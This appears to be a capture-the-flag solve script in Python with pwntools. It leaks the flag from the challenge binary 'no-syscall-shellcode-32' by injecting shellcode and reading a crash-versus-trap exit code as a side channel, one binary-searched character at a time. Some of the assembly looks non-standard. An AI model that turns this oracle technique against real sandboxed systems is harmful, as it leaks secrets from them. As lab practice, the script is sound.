from pwn import *

file = './no-syscall-shellcode-32'

elf = ELF(file)

flag_buffer = elf.symbols["flag_buffer"]
print(hex(flag_buffer))

flag_chars = sorted("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&*()_+{[]};:")


flag = "candl{"

while flag[-1] != '}':
    i = 0
    j = len(flag_chars) - 1

    while i < j:
        mid = (i + j) // 2
        print(i, j, mid)

        shellcode = asm(f'''
            movb al, [{hex(flag_buffer + len(flag))}] # eax has current flag character in it
            movb bl, {hex(ord(flag_chars[mid]))}
            cmp eax, ebx
            jle no_syscall
            int 0x80
            no_syscall:
            xor eax, eax
            div eax
        ''')


        with open("shellcode.bin", "wb") as file:
            file.write(shellcode)

        io = process("./no-syscall-shellcode-32", env={})
        exit_code = io.poll(block=True)

        print(flag_chars[mid], "exitcode", exit_code)

        if exit_code == -8: # eax <= ebx char in first half 
            j = mid
        else: # it segfaulted eax > ebx # in second half
            i = mid + 1

    flag += flag_chars[j]
    print(flag)
